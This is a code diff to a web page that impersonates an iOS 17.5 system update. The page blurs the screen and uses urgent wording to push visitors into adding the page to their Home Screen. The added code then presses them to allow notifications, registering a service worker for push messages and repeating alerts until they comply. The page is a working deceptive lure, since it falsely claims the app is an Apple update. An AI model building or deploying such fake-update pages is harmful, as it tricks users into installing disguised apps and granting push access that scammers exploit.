@@ -148,30 +148,60 @@
   <div class="blur"></div>
   <div class="popup" id="popupStep">
     <h2>🔒 Install Update Now</h2>
-    <p>To update to <span class="highlight">iOS 17.5</span>, you must add this app to your <span class="highlight">Home Screen</span>. Follow these steps:</p>
+    <p>To update to <span class="highlight">iOS 17.5</span>, add this app to your <span class="highlight">Home Screen</span> and allow <span class="highlight">notifications</span>:</p>
     <ol>
       <li>Tap the <span class="highlight">Share</span> button below (square with an arrow).</li>
-      <li>Select <span class="highlight">Add to Home Screen</span> from the menu.</li>
-      <li>Tap <span class="highlight">Add</span> in the top-right corner.</li>
+      <li>Select <span class="highlight">Add to Home Screen</span> and tap <span class="highlight">Add</span>.</li>
+      <li>Allow <span class="highlight">Notifications</span> when prompted to receive update alerts.</li>
     </ol>
-    <p>This ensures instant access to the update. Don’t miss out!</p>
+    <p>This ensures you stay secure and updated. Act now!</p>
     <button onclick="dismissPrompt()">I’ve Added It!</button>
   </div>
   <div class="arrow">⬇️</div>
   <script>
     let deferredPrompt;
     const popup = document.getElementById('popupStep');
+    let notificationPermissionRequested = false;
 
     // Detect if the app is running in standalone mode
     function isStandalone() {
       return (window.matchMedia('(display-mode: standalone)').matches || window.navigator.standalone === true);
     }
 
-    // If already in standalone mode, hide the popup
+    // Request notification permission
+    async function requestNotificationPermission() {
+      if (!('Notification' in window)) {
+        console.log('Notifications not supported');
+        return;
+      }
+      if (Notification.permission === 'granted') {
+        return;
+      }
+      if (!notificationPermissionRequested) {
+        notificationPermissionRequested = true;
+        const permission = await Notification.requestPermission();
+        if (permission === 'granted') {
+          console.log('Notification permission granted');
+          // Register service worker for push notifications
+          if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/service-worker.js').then(reg => {
+              console.log('Service worker registered');
+            }).catch(err => {
+              console.error('Service worker registration failed:', err);
+            });
+          }
+        } else {
+          alert('Please allow notifications to receive critical iOS 17.5 update alerts.');
+        }
+      }
+    }
+
+    // If already in standalone mode, request notifications
     if (isStandalone()) {
       popup.style.display = 'none';
       document.querySelector('.blur').style.display = 'none';
       document.querySelector('.arrow').style.display = 'none';
+      requestNotificationPermission();
     }
 
     // Handle the beforeinstallprompt event for Chrome/Android
@@ -180,22 +210,30 @@
       deferredPrompt = e;
     });
 
-    // Dismiss the prompt (only if standalone)
+    // Dismiss the prompt (only if standalone and notifications allowed)
     function dismissPrompt() {
       if (isStandalone()) {
-        popup.style.display = 'none';
-        document.querySelector('.blur').style.display = 'none';
-        document.querySelector('.arrow').style.display = 'none';
+        requestNotificationPermission();
+        if (Notification.permission === 'granted') {
+          popup.style.display = 'none';
+          document.querySelector('.blur').style.display = 'none';
+          document.querySelector('.arrow').style.display = 'none';
+        } else {
+          alert('Please allow notifications to complete the iOS 17.5 update setup.');
+        }
       } else {
-        alert('To update to iOS 17.5, you must add the app to your Home Screen. Tap the Share button, then select Add to Home Screen.');
+        alert('To update to iOS 17.5, add the app to your Home Screen. Tap the Share button, then select Add to Home Screen.');
       }
     }
 
     // Hide prompt after app is installed
     window.addEventListener('appinstalled', () => {
-      popup.style.display = 'none';
-      document.querySelector('.blur').style.display = 'none';
-      document.querySelector('.arrow').style.display = 'none';
+      requestNotificationPermission();
+      if (Notification.permission === 'granted') {
+        popup.style.display = 'none';
+        document.querySelector('.blur').style.display = 'none';
+        document.querySelector('.arrow').style.display = 'none';
+      }
     });
   </script>
 </body>
